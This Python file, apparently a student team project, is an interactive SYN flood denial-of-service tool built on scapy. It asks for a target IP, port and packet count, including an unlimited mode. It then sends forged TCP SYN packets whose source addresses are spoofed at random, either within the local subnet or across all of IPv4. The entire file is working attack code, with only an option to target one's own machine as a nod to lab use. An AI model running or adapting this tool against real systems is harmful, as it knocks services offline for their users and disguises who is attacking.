import ipaddress
from operator import sub
from tabnanny import verbose
from scapy.all import *
import os
import random
import socket
import netifaces



def getSubnet(ip): #mohammad
    interfaces = netifaces.interfaces()
    subnetmask = ""
    for iface in interfaces:
        interface = netifaces.ifaddresses(iface)
        if(2 in interface.keys()):
            physicalInterface = interface[2][0]
            if(ip in physicalInterface.values()):
                subnetmask = physicalInterface['netmask']
    return subnetmask



def getLocalIP(target,port): #chadi
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.1.122", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def getNetwork(target,port): #mohammad
    ip = getLocalIP(target,port)
    subnet = getSubnet(ip)
    network = ipaddress.IPv4Network(ip+"/"+subnet,strict=False)
    return network

def random_ip(network): #chadi
    network = ipaddress.IPv4Network(network)
    network_int, = struct.unpack("!I", network.network_address.packed) # make network address into an integer
    rand_bits = network.max_prefixlen - network.prefixlen # calculate the needed bits for the host part
    rand_host_int = random.randint(0, 2**rand_bits - 1) # generate random host part
    ip_address = ipaddress.IPv4Address(network_int + rand_host_int) # combine the parts 
    return ip_address.exploded


def SYN_DOS(destIP,destPort,counter,singleIPBool, subIPBool):  #chadi
    total = 0
    network = getNetwork(destIP,destIP)
    if singleIPBool and subIPBool:
        src_IP = random_ip(network)
        print("Attacking from {}",src_IP)

    elif singleIPBool and not subIPBool:
        src_IP = random_ip('0.0.0.0/0')
        print("Attacking from {}",src_IP)

    else:
        print("Attacking from multiple IPs")

    while(total < counter or counter == -1):
        sport= random.randint(1000,9000)
        seq= random.randint(1000,9000)
        window= random.randint(1000,9000)
        
        IP_Packet = IP() #Declaring an IP packet

        #Assign the IP address depending on whether it should be fixed or not
        if singleIPBool:
            IP_Packet.src = src_IP
        else:
            IP_Packet.src = random_ip(network) if subIPBool else random_ip('0.0.0.0/0')

        IP_Packet.dst = destIP            #Using the IP address inserted by the attacker (the destination)
        
        TCP_Packet = TCP()
        TCP_Packet.sport = sport       #Using a random port
        TCP_Packet.seq = seq           #Using a random sequency number
        TCP_Packet.window = window     #Using a random window size
        TCP_Packet.dport = destPort     #Using the port number inserted by the attacker
        TCP_Packet.flags = "S"         #S flag implying a SYN packet to be sent
        
        packet_to_send = IP_Packet/TCP_Packet
        send(packet_to_send , verbose=0)       #Stacking up the layers
        total +=1
        print(str(total) + " Packets Sent",end='\r')  #printing number of packets sent
        time.sleep(0.01)


def getDestPort(): #mohammad
    while(True):
        destPort = input("Target Port: ")
        try:
            destPort = int(destPort)  #keep looping until integer
            return destPort
        except ValueError:
            print("Please Enter Integer")


def getNumofPackets(): #mohammad
    while(True):   
        counter = input("How many packets to send (INF/inf for continuous): ")
        if(counter == "INF" or counter == 'inf'):  #special value for inf
            return -1
        else:
            try:
                counter = int(counter)  #keep looping until integer
                return counter
            except ValueError:
                print("Please Enter Correct Value")

def getifSingleIP(): #mohammad 

    while(True): #keep looping until y/n
        singleIP = input("Do you want to use a single IP for the attack (Y/N)? ")
        if(singleIP == "Y" or singleIP == "y"):   
            return True
        elif (singleIP =="N" or singleIP =="n"):
            return False
        else:
            print("Please Enter Correct Value")

def getifSameSubnet(): #mohammad 

    while(True): #keep looping until y/n
        sameSub = input("Do you want the spoofed IP to be on the same subnet (Y/N)? ")
        if(sameSub  == "Y" or sameSub  == "y"):   
            return True
        elif (sameSub  =="N" or sameSub  =="n"):
            return False
        else:
            print("Please Enter Correct Value")

def getDestIP(): #Fouad
    yourIP = input("Do you want to use your own IP as a victim (Y/N)? ")

    if(yourIP == "Y" or yourIP == "y"):   
        destIP = get_if_addr(conf.iface)
        return destIP

    elif (yourIP =="N" or yourIP =="n"):
        destIP = input("Target IP: ")
        return destIP
    else:
        print("Please Enter Correct Value")

def main():    #mohammad/chadi
    os.system("cls") #Clearing the screen
    destIP = getDestIP()
    print("Destination IP is {}".format(destIP))
    destPort = getDestPort()
    counter = getNumofPackets()
    singleIPBool = getifSingleIP()
    subIPBool = getifSameSubnet()
    SYN_DOS(destIP,destPort,counter,singleIPBool, subIPBool) 

main()